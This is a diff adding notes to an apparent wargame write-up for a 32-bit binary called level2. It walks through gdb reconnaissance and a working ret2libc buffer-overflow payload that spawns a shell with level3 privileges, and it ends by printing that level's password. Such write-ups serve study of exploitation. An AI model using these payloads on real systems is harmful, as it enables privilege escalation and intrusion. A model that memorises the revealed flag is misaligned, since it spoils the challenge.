@@ -48,6 +48,7 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
   0x080485d0  __do_global_ctors_aux
   0x080485fc  _fin
 #+end_src
+
 ** Get strings
 #+begin_src shell
 readelf -p .rodata level2
@@ -57,7 +58,7 @@ String dump of section '.rodata':
 #+end_src
 
 ** Find /bin/sh
-let's take the adrres of /bin/sh -> maybe useful later
+let's take the addres of /bin/sh -> maybe useful later
 #+begin_src shell
 (gdb) find &system, +9999999, "/bin/sh"
 0xb7f8cc58
@@ -112,3 +113,105 @@ End of assembler dump.
 #+end_src
 [[source]]
 * Explotation
+ Inside P  we can't modify  the return address to point system.
+** Goal
+execute ~system("/bin/sh")~
+*** First step Got the string.
+is there any string not in our elf that got that strings
+**** Watch the  loaded elf's  in runtime
+#+begin_src shell
+info proc map
+process 3386
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+#+end_src
+***** Let's try in libc
+   
+#+begin_src shell
+  #    va_libc_start, va_libc_end, "search"
+  find    0xb7e2c000, 0xb7fd2000, "/bin/sh"
+  0xb7f8cc58
+  x/s 0xb7f8cc58
+  0xb7f8cc58:	 "/bin/sh"
+#+end_src
+***** If not try on ld.
+*** Second step Got the system va.
+#+begin_src shell
+p system
+$1 = ... 0xb7e6b060 <system>
+#+end_src
+*** Third  step  Got the offset.
+#+begin_src shell
+  info frame
+  Stack level 0, frame at 0xbffffc50:
+  eip = 0x80484ed in p; saved eip 0x804854a
+  called by frame at 0xbffffc60
+  Arglist at 0xbffffc48, args: 
+  Locals at 0xbffffc48, Previous frame's sp is 0xbffffc50
+   Saved registers:
+    ebp at 0xbffffc48, eip at 0xbffffc4c
+
+  p/d  0xbffffc4c - $eax
+  $8 = 80
+#+end_src
+*** Explain the idea. 
+The idea in this  case is  to beside jump  directly to system in return p,  jmp to main  and in the return of main or the return  of p. launch the system, if we want we could do it stealth  with also adding the  exit  va  and  the value  to return.
+**** ret va
+#+begin_src shell
+disassemble main
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   %ebp
+   0x08048540 <+1>:	mov    %esp,%ebp
+   0x08048542 <+3>:	and    $0xfffffff0,%esp
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave  
+   0x0804854b <+12>:	ret    
+End of assembler dump.
+  0x0804854b #main  one
+#+end_src
+**** exit va
+#+begin_src shell
+p  exit
+$2 = {...} 0xb7e5ebe0 <exit>
+#+end_src
+*** Forth step  exploit
+offset = 80
+ret va = "\x08\x04\x85\x4b"
+system va = "\xb7\xe6\xb0\x60"
+exit  va="\xb7\xe5\xeb\xe0"
+"/bin/sh"va =  "\xb7\xf8\xcc\x58"
+"[::-1] Use  it for use little endian.
+
+payload = "offset + ret va + system va + [exit_va/whatever] +  "/bin/sh" va   [ + exit_status]
+
+#+begin_src shell
+    python -c 'print  "A"*80 + "\x08\x04\x85\x4b"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "A" * 4 + "\xb7\xf8\xcc\x58"[::-1]' > tmp3
+   cat  tmp3 - | ./level2
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK…AAAAAAAAAAAAK…`°æ·AAAAXÌø·
+  id
+  uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+  whoami
+  level3
+  Segmentation fault (core dumped)
+ cat  tmp - | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK…AAAAAAAAAAAAK…`°æ·àëå·XÌø·
+id
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+cat /home/user/`whoami`/.pass
+     492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+#+end_src
+
